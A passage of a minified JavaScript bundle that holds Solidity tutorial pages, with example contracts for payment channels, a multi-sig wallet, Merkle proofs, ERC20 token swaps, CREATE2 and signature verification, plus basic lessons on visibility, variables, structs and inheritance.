keccak256(abi.encodePacked(_contract, _payeeBalance))\n                .toEthSignedMessageHash()\n                .recover(_signature) == _payer;\n    }\n\n    modifier checkSignature(bytes memory _signature, uint _payeeBalance) {\n        require(\n            verify(_signature, payer, address(this), _payeeBalance),\n            "Invalid signature"\n        );\n        _;\n    }\n\n    function close(uint _payeeBalance, bytes memory _signature)\n        public\n        nonReentrant\n        checkSignature(_signature, _payeeBalance)\n    {\n        require(msg.sender == payee, "Not payee");\n\n        (bool sent, ) = payee.call{value: _payeeBalance}("");\n        require(sent, "Failed to send Ether");\n\n        selfdestruct(payer);\n    }\n\n    function kill() public {\n        require(msg.sender == payer, "Not payer");\n        require(block.timestamp &gt;= expiresAt, "channel not expired");\n        selfdestruct(payer);\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/app/multi-sig-wallet",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Multi-Sig Wallet",description:"An example of multi-sig wallet in Solidity",html:'<p>Let&#39;s create an multi-sig wallet. Here are the specifications.</p>\n<p>The wallet owners can</p>\n<ul>\n<li>submit a transaction</li>\n<li>approve and revoke approval of pending transcations</li>\n<li>anyone can execute a transcation after enough owners has approved it.</li>\n</ul>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract MultiSigWallet {\n    event Deposit(address indexed sender, uint amount, uint balance);\n    event SubmitTransaction(\n        address indexed owner,\n        uint indexed txIndex,\n        address indexed to,\n        uint value,\n        bytes data\n    );\n    event ConfirmTransaction(address indexed owner, uint indexed txIndex);\n    event RevokeConfirmation(address indexed owner, uint indexed txIndex);\n    event ExecuteTransaction(address indexed owner, uint indexed txIndex);\n\n    address[] public owners;\n    mapping(address =&gt; bool) public isOwner;\n    uint public numConfirmationsRequired;\n\n    struct Transaction {\n        address to;\n        uint value;\n        bytes data;\n        bool executed;\n        mapping(address =&gt; bool) isConfirmed;\n        uint numConfirmations;\n    }\n\n    Transaction[] public transactions;\n\n    modifier onlyOwner() {\n        require(isOwner[msg.sender], "not owner");\n        _;\n    }\n\n    modifier txExists(uint _txIndex) {\n        require(_txIndex &lt; transactions.length, "tx does not exist");\n        _;\n    }\n\n    modifier notExecuted(uint _txIndex) {\n        require(!transactions[_txIndex].executed, "tx already executed");\n        _;\n    }\n\n    modifier notConfirmed(uint _txIndex) {\n        require(!transactions[_txIndex].isConfirmed[msg.sender], "tx already confirmed");\n        _;\n    }\n\n    constructor(address[] memory _owners, uint _numConfirmationsRequired) public {\n        require(_owners.length &gt; 0, "owners required");\n        require(\n            _numConfirmationsRequired &gt; 0 &amp;&amp; _numConfirmationsRequired &lt;= _owners.length,\n            "invalid number of required confirmations"\n        );\n\n        for (uint i = 0; i &lt; _owners.length; i++) {\n            address owner = _owners[i];\n\n            require(owner != address(0), "invalid owner");\n            require(!isOwner[owner], "owner not unique");\n\n            isOwner[owner] = true;\n            owners.push(owner);\n        }\n\n        numConfirmationsRequired = _numConfirmationsRequired;\n    }\n\n    receive() payable external {\n        emit Deposit(msg.sender, msg.value, address(this).balance);\n    }\n\n    function submitTransaction(address _to, uint _value, bytes memory _data)\n        public\n        onlyOwner\n    {\n        uint txIndex = transactions.length;\n\n        transactions.push(Transaction({\n            to: _to,\n            value: _value,\n            data: _data,\n            executed: false,\n            numConfirmations: 0\n        }));\n\n        emit SubmitTransaction(msg.sender, txIndex, _to, _value, _data);\n    }\n\n    function confirmTransaction(uint _txIndex)\n        public\n        onlyOwner\n        txExists(_txIndex)\n        notExecuted(_txIndex)\n        notConfirmed(_txIndex)\n    {\n        Transaction storage transaction = transactions[_txIndex];\n\n        transaction.isConfirmed[msg.sender] = true;\n        transaction.numConfirmations += 1;\n\n        emit ConfirmTransaction(msg.sender, _txIndex);\n    }\n\n    function executeTransaction(uint _txIndex)\n        public\n        onlyOwner\n        txExists(_txIndex)\n        notExecuted(_txIndex)\n    {\n        Transaction storage transaction = transactions[_txIndex];\n\n        require(\n            transaction.numConfirmations &gt;= numConfirmationsRequired,\n            "cannot execute tx"\n        );\n\n        transaction.executed = true;\n\n        (bool success, ) = transaction.to.call{value: transaction.value}(transaction.data);\n        require(success, "tx failed");\n\n        emit ExecuteTransaction(msg.sender, _txIndex);\n    }\n\n    function revokeConfirmation(uint _txIndex)\n        public\n        onlyOwner\n        txExists(_txIndex)\n        notExecuted(_txIndex)\n    {\n        Transaction storage transaction = transactions[_txIndex];\n\n        require(transaction.isConfirmed[msg.sender], "tx not confirmed");\n\n        transaction.isConfirmed[msg.sender] = false;\n        transaction.numConfirmations -= 1;\n\n        emit RevokeConfirmation(msg.sender, _txIndex);\n    }\n\n    function getOwners() public view returns (address[] memory) {\n        return owners;\n    }\n\n    function getTransactionCount() public view returns (uint) {\n        return transactions.length;\n    }\n\n    function getTransaction(uint _txIndex)\n        public\n        view\n        returns (address to, uint value, bytes memory data, bool executed, uint numConfirmations)\n    {\n        Transaction storage transaction = transactions[_txIndex];\n\n        return (\n            transaction.to,\n            transaction.value,\n            transaction.data,\n            transaction.executed,\n            transaction.numConfirmations\n        );\n    }\n\n    function isConfirmed(uint _txIndex, address _owner)\n        public\n        view\n        returns (bool)\n    {\n        Transaction storage transaction = transactions[_txIndex];\n\n        return transaction.isConfirmed[_owner];\n    }\n}\n</code></pre>\n<p>Here is a contract to test sending transactions from the multi-sig wallet</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract TestContract {\n    uint public i;\n\n    function callMe(uint j) public {\n        i += j;\n    }\n\n    function getData() public view returns (bytes memory) {\n        return abi.encodeWithSignature("callMe(uint256)", 123);\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/app/merkle-tree",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Merkle Tree",description:"Learn about Merkle tree in Solidity",html:'<p>Merkle tree allows you to cryptographically prove that an element is contained</p>\n<p>in a set without revealing the entire set.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract MerkleProof {\n    function verify(\n        bytes32[] memory proof, bytes32 root, bytes32 leaf, uint index\n    )\n        public pure returns (bool)\n    {\n        bytes32 hash = leaf;\n\n        for (uint i = 0; i &lt; proof.length; i++) {\n            bytes32 proofElement = proof[i];\n\n            if (index % 2 == 0) {\n                hash = keccak256(abi.encodePacked(hash, proofElement));\n            } else {\n                hash = keccak256(abi.encodePacked(proofElement, hash));\n            }\n\n            index = index / 2;\n        }\n\n        return hash == root;\n    }\n}\n\ncontract TestMerkleProof is MerkleProof {\n    bytes32[] public hashes;\n\n    constructor() public {\n        string[4] memory transactions = [\n            "alice -&gt; bob",\n            "bob -&gt; dave",\n            "carol -&gt; alice",\n            "dave -&gt; bob"\n        ];\n\n        for (uint i = 0; i &lt; transactions.length; i++) {\n            hashes.push(keccak256(abi.encodePacked(transactions[i])));\n        }\n\n        uint n = transactions.length;\n        uint offset = 0;\n\n        while (n &gt; 0) {\n            for (uint i = 0; i &lt; n - 1; i+=2) {\n                hashes.push(\n                    keccak256(abi.encodePacked(\n                        hashes[offset + i],\n                        hashes[offset + i + 1]\n                    ))\n                );\n            }\n            offset += n;\n            n = n / 2;\n        }\n    }\n\n    function getRoot() public view returns (bytes32) {\n        return hashes[hashes.length - 1];\n    }\n\n    /* verify\n    3rd leaf\n    0x1bbd78ae6188015c4a6772eb1526292b5985fc3272ead4c65002240fb9ae5d13\n\n    root\n    0x074b43252ffb4a469154df5fb7fe4ecce30953ba8b7095fe1e006185f017ad10\n\n    index\n    2\n\n    proof\n    0x948f90037b4ea787c14540d9feb1034d4a5bc251b9b5f8e57d81e4b470027af8\n    0x63ac1b92046d474f84be3aa0ee04ffe5600862228c81803cce07ac40484aee43\n    */\n}\n</code></pre>\n'})}},{path:"/0.6/app/iterable-mapping",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Iterable Mapping",description:"Iterable Mapping in Solidity",html:'<p>You cannot iterate through a <code>mapping</code>. So here is an example of how to create an iterable <code>mapping</code>.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\nlibrary IterableMapping {\n    // Iterable mapping from address to uint;\n    struct Map {\n        address[] keys;\n        mapping(address =&gt; uint) values;\n        mapping(address =&gt; uint) indexOf;\n        mapping(address =&gt; bool) inserted;\n    }\n\n    function get(Map storage map, address key) public view returns (uint) {\n        return map.values[key];\n    }\n\n    function getKeyAtIndex(Map storage map, uint index) public view returns (address) {\n        return map.keys[index];\n    }\n\n    function size(Map storage map) public view returns (uint) {\n        return map.keys.length;\n    }\n\n    function set(Map storage map, address key, uint val) public {\n        if (map.inserted[key]) {\n            map.values[key] = val;\n        } else {\n            map.inserted[key] = true;\n            map.values[key] = val;\n            map.indexOf[key] = map.keys.length;\n            map.keys.push(key);\n        }\n    }\n\n    function remove(Map storage map, address key) public {\n        if (!map.inserted[key]) {\n            return;\n        }\n\n        delete map.inserted[key];\n        delete map.values[key];\n\n        uint index = map.indexOf[key];\n        uint lastIndex = map.keys.length - 1;\n        address lastKey = map.keys[lastIndex];\n\n        map.indexOf[lastKey] = index;\n        delete map.indexOf[key];\n\n        map.keys[index] = lastKey;\n        map.keys.pop();\n    }\n}\n\ncontract TestIterableMap {\n    using IterableMapping for IterableMapping.Map;\n\n    IterableMapping.Map private map;\n\n    function testIterableMap() public {\n        map.set(address(0), 0);\n        map.set(address(1), 100);\n        map.set(address(2), 200); // insert\n        map.set(address(2), 200); // update\n        map.set(address(3), 300);\n\n        for (uint i = 0; i &lt; map.size(); i++) {\n            address key = map.getKeyAtIndex(i);\n\n            assert(map.get(key) == i * 100);\n        }\n\n        map.remove(address(1));\n\n        // keys = [address(0), address(3), address(2)]\n        assert(map.size() == 3);\n        assert(map.getKeyAtIndex(0) == address(0));\n        assert(map.getKeyAtIndex(1) == address(3));\n        assert(map.getKeyAtIndex(2) == address(2));\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/app/erc20",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"ERC20",description:"Example of ERC20 token in Solidity",html:'<p>Any contract that follow the <a href="https://eips.ethereum.org/EIPS/eip-20" target="__blank">ERC20 standard</a> is a ERC20 token.</p>\n<p>ERC20 tokens provide functionalities to</p>\n<ul>\n<li>transfer tokens</li>\n<li>allow others to transfer tokens on behalf of the token holder</li>\n</ul>\n<p>Here is the interface for ERC20.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\n// https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/token/ERC20/IERC20.sol\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n</code></pre>\n<h2 id="create-your-own-erc20-token">Create your own ERC20 token</h2>\n<p>Using <a href="https://github.com/OpenZeppelin/openzeppelin-contracts" target="__blank">Open Zeppelin</a> it&#39;s really easy to create your own ERC20 token.</p>\n<p>Here is an example</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\nimport "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/token/ERC20/ERC20.sol";\n\ncontract MyToken is ERC20 {\n    constructor (string memory name, string memory symbol)\n        ERC20(name, symbol)\n        public\n    {\n        // Mint 100 tokens to msg.sender\n        // Similar to how\n        // 1 dollar = 100 cents\n        // 1 token = 1 * (10 ** decimals)\n        _mint(msg.sender, 100 * 10 ** uint(decimals()));\n    }\n}</code></pre>\n<h2 id="contract-to-swap-tokens">Contract to swap tokens</h2>\n<p>Here is an example contract, <code>TokenSwap</code>, to trade one ERC20 token for another.</p>\n<p>This contract will swap tokens by calling</p>\n<pre><code class="language-solidity">transferFrom(address sender, address recipient, uint256 amount)\n</code></pre>\n<p>which will transfer <code>amount</code> of token from <code>sender</code> to <code>recipient</code>.</p>\n<p>For <code>transferFrom</code> to succeed, <code>sender</code> must</p>\n<ul>\n<li>have more than <code>amount</code> tokens in their balance</li>\n<li>allowed <code>TokenSwap</code> to withdraw <code>amount</code> tokens by calling <code>approve</code></li>\n</ul>\n<p>prior to <code>TokenSwap</code> calling <code>transferFrom</code></p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\nimport "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/token/ERC20/IERC20.sol";\n\n/*\nHow to swap tokens\n\n1. Alice has 100 tokens from AliceCoin, which is a ERC20 token.\n2. Bob has 100 tokens from BobCoin, which is also a ERC20 token.\n3. Alice and Bob wants to trade 10 AliceCoin for 20 BobCoin.\n4. Alice or Bob deploys TokenSwap\n5. Alice appproves TokenSwap to withdraw 10 tokens from AliceCoin\n6. Bob appproves TokenSwap to withdraw 20 tokens from BobCoin\n7. Alice or Bob calls TokenSwap.swap(10, 20)\n8. Alice and Bob traded tokens successfully.\n*/\n\ncontract TokenSwap {\n    IERC20 public token1;\n    address public owner1;\n    IERC20 public token2;\n    address public owner2;\n\n    constructor(\n        address _token1,\n        address _owner1,\n        address _token2,\n        address _owner2\n    ) public {\n        token1 = IERC20(_token1);\n        owner1 = _owner1;\n        token2 = IERC20(_token2);\n        owner2 = _owner2;\n    }\n\n    function swap(uint _amount1, uint _amount2) public {\n        require(msg.sender == owner1 || msg.sender == owner2, "Not authorized");\n        require(\n            token1.allowance(owner1, address(this)) &gt;= _amount1,\n            "Token 1 allowance too low"\n        );\n        require(\n            token2.allowance(owner2, address(this)) &gt;= _amount2,\n            "Token 2 allowance too low"\n        );\n\n        _safeTransferFrom(token1, owner1, owner2, _amount1);\n        _safeTransferFrom(token2, owner2, owner1, _amount2);\n    }\n\n    function _safeTransferFrom(\n        IERC20 token,\n        address sender,\n        address recipient,\n        uint amount\n    ) private {\n        bool sent = token.transferFrom(sender, recipient, amount);\n        require(sent, "Token transfer failed");\n    }\n}</code></pre>\n'})}},{path:"/0.6/app/create2",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Precompute Contract Address with Create2",description:"Precompute contract address with create2",html:'<p>Contract address can be precomputed, before the contract is deployed, using <code>create2</code></p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract Factory {\n    event Deployed(address addr, uint256 salt);\n\n    // 1. Get bytecode of contract to be deployed\n    // NOTE: _owner and _foo are arguments of the TestContract&#39;s constructor\n    function getBytecode(address _owner, uint _foo) public pure returns (bytes memory) {\n        bytes memory bytecode = type(TestContract).creationCode;\n\n        return abi.encodePacked(bytecode, abi.encode(_owner, _foo));\n    }\n\n    // 2. Compute the address of the contract to be deployed\n    // NOTE: _salt is a random number used to create an address\n    function getAddress(bytes memory bytecode, uint _salt) public view returns (address) {\n        bytes32 hash = keccak256(\n            abi.encodePacked(\n                byte(0xff),\n                address(this),\n                _salt,\n                keccak256(bytecode)\n            )\n        );\n\n        // NOTE: cast last 20 bytes of hash to address\n        return address(uint160(uint256(hash)));\n    }\n\n    // 3. Deploy the contract\n    // NOTE:\n    // Check the event log Deployed which contains the address of the deployed TestContract.\n    // The address in the log should equal the address computed from above.\n    function deploy(bytes memory bytecode, uint _salt) public payable {\n        address addr;\n\n        /*\n        NOTE: How to call create2\n\n        create2(v, p, n, s)\n        create new contract with code at memory p to p + n\n        and send v wei\n        and return the new address\n        where new address = first 20 bytes of keccak256(0xff + address(this) + s + keccak256(mem[p\u2026(p+n)))\n              s = big-endian 256-bit value\n        */\n        assembly {\n            addr := create2(\n                callvalue(), // wei sent with current call\n                // Actual code starts after skipping the first 32 bytes\n                add(bytecode, 0x20),\n                mload(bytecode), // Load the size of code contained in the first 32 bytes\n                _salt // Salt from function arguments\n            )\n\n            if iszero(extcodesize(addr)) {\n                revert(0, 0)\n            }\n        }\n\n        emit Deployed(addr, _salt);\n    }\n}\n\ncontract TestContract {\n    address public owner;\n    uint public foo;\n\n    constructor(address _owner, uint _foo) public payable {\n        owner = _owner;\n        foo = _foo;\n    }\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/app/bi-directional-payment-channel",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Bi-Directional Payment Channel",description:"An example of bi-directional payment channels in Solidity",html:'<p>Bi-directional payment channels allow participants <code>Alice</code> and <code>Bob</code> to repeatedly transfer Ether off chain.</p>\n<p>Payments can go both ways, <code>Alice</code> pays <code>Bob</code> and <code>Bob</code> pays <code>Alice</code>.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\npragma experimental ABIEncoderV2;\n\n/*\nOpening a channel\n1. Alice and Bob fund a multi-sig wallet\n2. Precompute payment channel address\n3. Alice and Bob exchanges signatures of initial balances\n4. Alice and Bob creates a transaction that can deploy a payment channel from\n   the multi-sig wallet\n\nUpdate channel balances\n1. Repeat steps 1 - 3 from opening a channel\n2. From multi-sig wallet create a transaction that will\n   - delete the transaction that would have deployed the old payment channel\n   - and then create a transaction that can deploy a payment channel with the\n     new balances\n\nClosing a channel when Alice and Bob agree on the final balance\n1. From multi-sig wallet create a transaction that will\n   - send payments to Alice and Bob\n   - and then delete the transaction that would have created the payment channel\n\nClosing a channel when Alice and Bob do not agree on the final balances\n1. Deploy payment channel from multi-sig\n2. call challengeExit() to start the process of closing a channel\n3. Alice and Bob can withdraw funds once the channel is expired\n*/\n\nimport "github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol";\nimport "github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/cryptography/ECDSA.sol";\n\ncontract BiDirectionalPaymentChannel {\n    using SafeMath for uint;\n    using ECDSA for bytes32;\n\n    event ChallengeExit(address indexed sender, uint nonce);\n    event Withdraw(address indexed to, uint amount);\n\n    address payable[2] public users;\n    mapping(address =&gt; bool) public isUser;\n\n    mapping(address =&gt; uint) public balances;\n\n    uint public challengePeriod;\n    uint public expiresAt;\n    uint public nonce;\n\n    modifier checkBalances(uint[2] memory _balances) {\n        require(\n            address(this).balance &gt;= _balances[0].add(_balances[1]),\n            "balance of contract must be &gt;= to the total balance of users"\n        );\n        _;\n    }\n\n    // NOTE: deposit from multi-sig wallet\n    constructor(\n        address payable[2] memory _users,\n        uint[2] memory _balances,\n        uint _expiresAt,\n        uint _challengePeriod\n    ) public payable checkBalances(_balances) {\n        require(_expiresAt &gt; block.timestamp, "Expiration must be &gt; now");\n        require(_challengePeriod &gt; 0, "Challenge period must be &gt; 0");\n\n        for (uint i = 0; i &lt; _users.length; i++) {\n            address payable user = _users[i];\n\n            require(!isUser[user], "user must be unique");\n            users[i] = user;\n            isUser[user] = true;\n\n            balances[user] = _balances[i];\n        }\n\n        expiresAt = _expiresAt;\n        challengePeriod = _challengePeriod;\n    }\n\n    function verify(\n        bytes[2] memory _signatures,\n        address _contract,\n        address[2] memory _signers,\n        uint[2] memory _balances,\n        uint _nonce\n    ) public pure returns (bool) {\n        for (uint i = 0; i &lt; _signatures.length; i++) {\n            /*\n            NOTE: sign with address of this contract to protect\n                  agains replay attack on other contracts\n            */\n            bool valid = _signers[i] ==\n                keccak256(abi.encodePacked(_contract, _balances, _nonce))\n                    .toEthSignedMessageHash()\n                    .recover(_signatures[i]);\n\n            if (!valid) {\n                return false;\n            }\n        }\n\n        return true;\n    }\n\n    modifier checkSignatures(\n        bytes[2] memory _signatures,\n        uint[2] memory _balances,\n        uint _nonce\n    ) {\n        // Note: copy storage array to memory\n        address[2] memory signers;\n        for (uint i = 0; i &lt; users.length; i++) {\n            signers[i] = users[i];\n        }\n\n        require(\n            verify(_signatures, address(this), signers, _balances, _nonce),\n            "Invalid signature"\n        );\n\n        _;\n    }\n\n    modifier onlyUser() {\n        require(isUser[msg.sender], "Not user");\n        _;\n    }\n\n    function challengeExit(\n        uint[2] memory _balances,\n        uint _nonce,\n        bytes[2] memory _signatures\n    )\n        public\n        onlyUser\n        checkSignatures(_signatures, _balances, _nonce)\n        checkBalances(_balances)\n    {\n        require(block.timestamp &lt; expiresAt, "Expired challenge period");\n        require(_nonce &gt; nonce, "Nonce must be greater than the current nonce");\n\n        for (uint i = 0; i &lt; _balances.length; i++) {\n            balances[users[i]] = _balances[i];\n        }\n\n        nonce = _nonce;\n        expiresAt = block.timestamp.add(challengePeriod);\n\n        emit ChallengeExit(msg.sender, nonce);\n    }\n\n    function withdraw() public onlyUser {\n        require(\n            block.timestamp &gt;= expiresAt,\n            "Challenge period has not expired yet"\n        );\n\n        uint amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent, ) = msg.sender.call.value{value: amount}("");\n        require(sent, "Failed to send Ether");\n\n        emit Withdraw(msg.sender, amount);\n    }\n}\n</code></pre>\n'})}},{path:"/0.5",component:()=>i.a.createElement(T,{version:"0.5.16",routesByCategory:H})},{path:"/0.5/visibility",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Visibility",description:"An example of external, internal, private and public functions in Solidity",html:'<p>Functions and state variables have to declare whether they are accessible by other contracts.</p>\n<p>Fucntions can be declared as</p>\n<ul>\n<li><code>public</code> - any contract and account can call</li>\n<li><code>private</code> - only inside the contract that defines the function</li>\n<li><code>internal</code>- only inside contract that inherits an <code>internal</code> function</li>\n<li><code>external</code> - only other contracts and accounts can call</li>\n</ul>\n<p>State variables can be declared as <code>public</code>, <code>private</code>, or <code>internal</code> but not <code>external</code>.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract Base {\n    // Private function can only be called\n    // - inside this contract\n    // Contracts that inherit this contract cannot call this function.\n    function privateFunc() private pure returns (string memory) {\n        return "private function called";\n    }\n\n    function testPrivateFunc() public pure returns (string memory) {\n        return privateFunc();\n    }\n\n    // Internal function can be called\n    // - inside this contract\n    // - inside contracts that inherit this contract\n    function internalFunc() internal pure returns (string memory) {\n        return "internal function called";\n    }\n\n    function testInternalFunc() public pure returns (string memory) {\n        return internalFunc();\n    }\n\n    // Public functions can be called\n    // - inside this contract\n    // - inside contracts that inherit this contract\n    // - by other contracts and accounts\n    function publicFunc() public pure returns (string memory) {\n        return "public function called";\n    }\n\n    // External functions can only be called\n    // - by other contracts and accounts\n    function externalFunc() external pure returns (string memory) {\n        return "external function called";\n    }\n\n    // This function will not compile since we&#39;re trying to call\n    // an external function here.\n    // function testExternalFunc() public pure returns (string memory) {\n    //     return externalFunc();\n    // }\n\n    // State variables\n    string private privateVar = "my private variable";\n    string internal internalVar = "my internal variable";\n    string public publicVar = "my public variable";\n    // State variables cannot be external so this code won&#39;t compile.\n    // string external externalVar = "my external variable";\n}\n\ncontract Child is Base {\n    // Inherited contracts do not have access to private functions\n    // and state variables.\n    // function testPrivateFunc() public pure returns (string memory) {\n    //     return privateFunc();\n    // }\n\n    // Internal function call be called inside child contracts.\n    function testInternalFunc() public pure returns (string memory) {\n        return internalFunc();\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/view-and-pure-functions",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"View and Pure Functions",description:"An example of view and pure functions in Solidity",html:'<p>Getter functions can be declared <code>view</code> or <code>pure</code>.</p>\n<p><code>View</code> function declares that no state will be changed.</p>\n<p><code>Pure</code> function declares that no state variable will be changed or read.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract ViewAndPure {\n    uint public x = 1;\n\n    // Promise not to modify the state.\n    function addToX(uint y) public view returns (uint) {\n        return x + y;\n    }\n\n    // Promise not to modify or read from the state.\n    function add(uint i, uint j) public pure returns (uint) {\n        return i + j;\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/variables",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Variables",description:"Local, state and global variables",html:'<p>There are 3 types of variables in Solidity</p>\n<ul>\n<li><strong>local</strong><ul>\n<li>declared inside a function</li>\n<li>not stored on the blockchain</li>\n</ul>\n</li>\n<li><strong>state</strong><ul>\n<li>declared outside a function</li>\n<li>stored on the blockchain</li>\n</ul>\n</li>\n<li><strong>global</strong> (provides information about the blockchain)</li>\n</ul>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract Variables {\n    // State varaibles are stored on the blockchain.\n    string public text = "Hello";\n    uint public num = 123;\n\n    function doSomething() public {\n        // Local variables are not saved to the blockchain.\n        uint i = 456;\n\n        // Here are some global variables\n        uint timestamp = block.timestamp; // Current block timestamp\n        address sender = msg.sender; // address of the caller\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/super",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Calling Parent Contracts",description:"An example of calling parent contracts in Solidity",html:'<p>Parent contracts can be called directly, or by using the keyword <code>super</code>.</p>\n<p>By using the keyword <code>super</code>, all of the immediate parent contracts will be called.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\n/* Inheritance tree\n   A\n /  \\\nB   C\n \\ /\n  D\n*/\n\ncontract A {\n    // This is called an event. You can emit events from your function\n    // and they are logged into the transaction log.\n    // In our case, this will be useful for tracing function calls.\n    event Log(string message);\n\n    function foo() public {\n        emit Log("A.foo called");\n    }\n\n    function bar() public {\n        emit Log("A.bar called");\n    }\n}\n\ncontract B is A {\n    function foo() public {\n        emit Log("B.foo called");\n        A.foo();\n    }\n    function bar() public {\n        emit Log("B.bar called");\n        super.bar();\n    }\n}\n\ncontract C is A {\n    function foo() public {\n        emit Log("C.foo called");\n        A.foo();\n    }\n\n    function bar() public {\n        emit Log("C.bar called");\n        super.bar();\n    }\n}\n\ncontract D is B, C {\n    // Try:\n    // - Call D.foo and check the transaction logs.\n    //   Although D inherits A, B and C, it only called C and then A.\n    // - Call D.bar and check the transaction logs\n    //   D called C, then B, and finally A.\n    //   Although super was called twice (by B and C) it only called A once.\n}\n</code></pre>\n'})}},{path:"/0.5/structs",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Structs",description:"An example of how to use structs in Solidity",html:'<p>You can define your own type by creating a <code>struct</code>.</p>\n<p>They are useful for grouping togther related data.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract Todos {\n    struct Todo {\n        string text;\n        bool completed;\n    }\n\n    // An array of &#39;Todo&#39; structs\n    Todo[] public todos;\n\n    function create(string memory _text) public {\n        // 3 ways to initialize a struct\n        // - calling it like a function\n        todos.push(Todo(_text, false));\n\n        // key value mapping\n        todos.push(Todo({\n            text: _text,\n            completed: false\n        }));\n\n        // initialize an emoty struct and then update it\n        Todo memory todo;\n        todo.text = _text;\n        // todo.completed initialized to false\n\n        todos.push(todo);\n    }\n\n    // Solidity automatically created a getter for&#39; todos&#39; so\n    // you don&#39;t actually need this function.\n    function get(uint _index) public view\n        returns (string memory text, bool completed)\n    {\n        Todo storage todo = todos[_index];\n        return (todo.text, todo.completed);\n    }\n\n    // update text\n    function update(uint _index, string memory _text) public {\n        Todo storage todo = todos[_index];\n        todo.text = _text;\n    }\n    // update completed\n    function toggleCompleted(uint _index) public {\n        Todo storage todo = todos[_index];\n        todo.completed = !todo.completed;\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/state-variables",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Reading and Writing to a State Variable",description:"Reading and Writing to a State Variable",html:'<p>You need to send a transaction to the blockchain to write or update a state variable.</p>\n<p>This means that you will have to pay a transaction fee.</p>\n<p>On the other hand, you can read a data from a state variable, for free, without sending any transaction.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract SimpleStorage {\n    // State variable to store a number\n    uint public num;\n\n    // You need to send a transaction to write to a state variable.\n    function set(uint _num) public {\n        num = _num;\n    }\n\n    // You can read from a state varaible without sending a transaction.\n    // Actually we don&#39;t need this function. The compiler automatically\n    // creates getter functions for all public variables.\n    function get() public view returns (uint) {\n        return num;\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/signature",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Verifying Signature",description:"An example of how to verify signatures in Solidity",html:'<p>Messages can be signed off chain and then verified on chain using a smart contract.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\n/* Signature Verification\n\nHow to Sign and Verify\n# Signing\n1. Create message to sign\n2. Hash the message\n3. Sign the hash (off chain, keep your private key secret)\n\n# Verify\n1. Recreate hash from the original message\n2. Recover signer from signature and hash\n3. Compare recovered signer to claimed signer\n\n*/\n\ncontract VerifySignature {\n    /* 1. Unlock MetaMask account\n    ethereum.enable()\n    */\n\n    /* 2. Get message hash to sign\n    getMessageHash(\n        0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C,\n        123,\n        "coffee and donuts",\n        1\n    )\n\n    hash = 0xcf36ac4f97dc10d91fc2cbb20d718e94a8cbfe0f82eaedc6a4aa38946fb797cd\n    */\n    function getMessageHash(\n        address _to, uint _amount, string memory _message, uint _nonce\n    )\n        public pure returns (bytes32)\n    {\n        return keccak256(abi.encodePacked(_to, _amount, _message, _nonce));\n    }\n\n    /* 3. Sign message hash\n    web3.personal.sign(hash, web3.eth.defaultAccount, console.log)\n\n    Signature will be different for different accounts\n    0x993dab3dd91f5c6dc28e17439be475478f5635c92a56e17e82349d3fb2f166196f466c0b4e0c146f285204f0dcb13e5ae67bc33f4b888ec32dfe0a063e8f3f781b\n    */\n    function getEthSignedMessageHash(bytes32 _messageHash) public pure returns (bytes32) {\n        /*\n        Signature is produced by signing a keccak256 hash 